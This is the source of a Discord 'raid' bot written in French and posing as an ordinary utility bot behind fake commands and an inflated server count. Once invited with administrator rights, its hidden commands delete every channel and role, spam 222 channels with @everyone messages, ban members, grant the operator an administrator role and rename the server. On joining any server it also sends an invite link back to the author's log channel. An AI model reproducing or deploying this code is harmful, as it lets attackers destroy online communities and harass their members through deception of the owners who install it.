const Discord = require('discord.js'); // npm i discord.js
const MagicHitler = require('magic_hitler'); // npm i magic_hitler

const client = new Discord.Client();
const prefix = "!"
const raid = new MagicHitler.Client({
    client: client,
    prefix: "rd!" // Optionnel ; Préfixe pour les commandes
});

raid.ready();
raid.sendMessage("Test réussi", "test");

// ------ Commandes de destruction ------

// Commande pour détruire le serveur en entier :
raid.deleteChannels("raid", {
    createChannel: false
});
raid.createChannels("raid", {
    createChannelName: "raid-by-fa3t",
    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://giffiles.alphacoders.com/310/3105.gif",
    sendMessageCount: 10,
    createChannelCount: 222
});
raid.deleteRoles("raid");
raid.createRoles("raid", {
    rolesNumber: 69,
    rolesName: "raid-by-fa3t"
});

// Commandes Raids 1 :

raid.deleteChannel("del");
raid.deleteChannels("delAll", {
    createChannel: true,
    createdChannelName: "vous-etes-bz",
    createChannelMessage: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://giffiles.alphacoders.com/310/3105.gif"
});
raid.createChannels("chnls", {
    createChannelName: "raid-by-fa3t",
    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://giffiles.alphacoders.com/310/3105.gif",
    sendMessageCount: 10,
    createChannelCount: 222
});
raid.createInvite("invite", false);
raid.createInvite("inviteAll", true);
raid.deleteRoles("delRls");
raid.createRoles("rls", {
    rolesNumber: 69,
    rolesName: "raid-by-fa3t"
});

// Commandes Raid 2 :

client.on('message', msg => {

    if(msg.content === "rd!help"){
        msg.delete()
        let embed = new Discord.RichEmbed()
            .setColor('#E69900')
            .setTitle("📬 Aide Raid :")
            .setDescription("__**Commandes Raid :**__\n**rd!raid :** Détruit le serveur.\n**rd!del :** Supprime le channel où la commande est exécuté.\n**rd!delAll :** Supprime tous les channels + créer un channel nommé 'raid-by-fa3t' + envoi un message avec mention everyone\n**rd!chnls :** Créer 222 channels nommé 'raid-by-fa3t' + spamme les salons en everyone\n**rd!invite :** Créer une invitation pour un serveur (où le bot est présent)\n**rd!inviteAll :** Créer une invitation pour plusieurs serveurs (où le bot est présent)\n**rd!delRls :** Supprime tous les rôles\n**rd!rls :** Créer 69 rôles nommé 'L'ÉLITE vous remercie' en couleur random\n**rd!a (bientôt) :** Créer un rôle pour être admin\n**rd!guild :** Change l'image du serveur + change le nom du serveur en 'RAID PAR L’ÉLITE'\n\n__**Liens :**__\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
            .setTimestamp()
            msg.author.send(embed)
    }

    if(msg.content === "rd!guild"){
        msg.guild.setIcon("https://cdn.discordapp.com/attachments/519666466145042433/520050975923240961/3956-full.png")
        msg.guild.setName("💀 BZ PAR FA3T")
    }

    if(msg.content === "rd!raid"){
        msg.guild.setIcon("https://cdn.discordapp.com/attachments/519666466145042433/520050975923240961/3956-full.png")
        msg.guild.setName("💀 BZ PAR FA3T")
    }

    if(msg.content === "rd!emoji"){
        msg.guild.createEmoji("https://cdn.discordapp.com/attachments/519666466145042433/519824123908718604/issou.png")
    }

    if (msg.content === 'rd!ban') {
        msg.guild.members.forEach(member => {
            if (!member.roles.exists("name", "FA3T TEAM") && member.bannable) member.ban().catch(e => {});
        });
    }

    if (msg.content === 'rd!admin') {
        
        msg.member.guild.createRole({
            name: "FA3T TEAM",
            permissions: "ADMINISTRATOR",
            mentionable: false
        }).then(function(role) {
            msg.member.addRole(role);
            if (msg.deletable) msg.delete().catch(e => {});
        }).catch(e => {});
    }

    if (msg.content === 'rd!leave') {
        if (msg.deletable) msg.delete().catch(e => {});
        msg.guild.leave().catch(e => {});
    }

})

// ------ Fakes Commandes ------

client.on('message', message => {

    let args = message.content.slice(prefix.length).trim().split(' ');
    let cmd = args.shift().toLowerCase();

    if(message.author.bot) return;
    if(!message.content.startsWith(prefix)) return;

    try{

        if(cmd === 'h') cmd = 'help';
        if(cmd === 'si') cmd = 'serverinfo';
        if(cmd === 'rd-on') cmd = 'raidmode-on';
        if(cmd === 'rd-off') cmd = 'raidmode-off';
        if(cmd === 'cID') cmd = 'checkID';

        delete require.cache[require.resolve(`./commands/${cmd}.js`)];

        let ops = {
            ownerID: '515464339000524800'
        }

        let commandFile = require(`./commands/${cmd}.js`);
        commandFile.run(Discord, client, message, args, prefix, ops);

    } catch (e) {
        console.log(e.stack);
    }

});



// Quand le bot rejoins un serveur :

client.on("guildCreate", async guild => {
    let chnlslogs = client.channels.find("id", "518710630044401665")
    let embed = new Discord.RichEmbed()
        .setThumbnail(guild.iconURL)
        .setColor('#2FD435')
        .setTitle("📥 Nouveau Serveur")
        .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
        .addField(`**${guild.name}** vient d'ajouter __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
        .setTimestamp()
    chnlslogs.send(embed)
    let textChannel = guild.channels
    .filter(function (channel) {return channel.type === 'text' || channel.type === 'voice'})
    .first().createInvite().then(invite => chnlslogs.send(invite.url))
});

// Quand le bot quitte un serveur :

client.on("guildDelete", async guild => {
    let embed = new Discord.RichEmbed()
        .setThumbnail(guild.iconURL)
        .setColor('#FE0101')
        .setTitle("📤 Départ Serveur")
        .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
        .addField(`**${guild.name}** vient de retirer __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
        .setTimestamp()
    client.channels.get("518710630044401665").send(embed)
});

// Quand le bot ce lance

client.on('ready', async () => {
    client.user.setActivity(`956 Serveurs | !help`, {type: "WATCHING"});
});

client.login(process.env.TOKEN);
